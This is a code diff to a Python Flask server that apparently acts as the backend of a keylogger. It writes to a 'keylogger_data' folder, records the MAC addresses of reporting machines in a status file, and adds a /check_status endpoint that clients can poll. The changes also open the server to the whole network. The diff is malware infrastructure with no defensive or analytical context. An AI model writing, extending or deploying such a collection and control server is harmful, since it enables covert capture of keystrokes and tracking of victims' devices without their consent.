@@ -38,15 +38,33 @@ def add_data():
         return jsonify({'post':'successful','if exit':'False'}), 200
 
 
+with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
+    json.dump({'flask':True}, f)
+
 @app.route('/send_mac', methods=['POST'])
 def send_mac():
-    data = request.data
-    with open(r'C:\Users\User\Desktop/keylogger_data/mac_addresses.json', 'a') as f:
-        f.write(data.decode()+'\n')
-        print(data.decode())
+    mac = request.data
+    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
+        dict_f = json.loads(f.read())
+        dict_f[mac.decode()] = True
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
+            json.dump(dict_f, file)
+        print(mac.decode())
     return jsonify({'post':'successful'}), 200
 
 
+@app.route('/check_status', methods=['GET'])
+def check_status():
+    mac = request.args.get('mac')
+    if mac:
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
+            dic_status = json.loads(f.read())
+            print(dic_status)
+            if dic_status[mac] == False:
+                return jsonify({'get':'successful'}), 400
+    return jsonify({'get':'not successful'}), 200
 
 
-app.run(debug=True)
+
+
+app.run(debug=True, host='0.0.0.0')
